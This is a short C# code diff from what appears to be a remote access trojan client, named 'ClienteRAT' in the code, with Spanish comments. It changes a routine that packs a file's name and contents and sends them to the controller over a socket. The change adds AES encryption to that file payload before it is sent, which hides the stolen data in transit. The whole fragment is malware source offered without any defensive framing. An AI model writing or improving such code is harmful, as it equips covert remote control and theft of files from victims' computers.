@@ -1,7 +1,7 @@
 ﻿
 using System.Text;
 using Client.Conexion;
-
+using Client.Crypto;
 
 namespace Client.Util
 {
@@ -53,8 +53,9 @@ namespace Client.Util
                 Buffer.BlockCopy(fileNameBytes, 0, payload, 0, fileNameBytes.Length);
                 Buffer.BlockCopy(fileContent, 0, payload, fileNameBytes.Length, fileContent.Length);
 
+                byte[] encryptedPayload = AesHelper.EncryptWithAes(payload, ClienteRAT.getAesKey());
                 // Enviar usando el protocolo
-                Protocol.Send(ClientSocket.getClientStream(), Channel.File, payload);
+                Protocol.Send(ClientSocket.getClientStream(), Channel.File, encryptedPayload);
             }
             catch (Exception ex)
             {
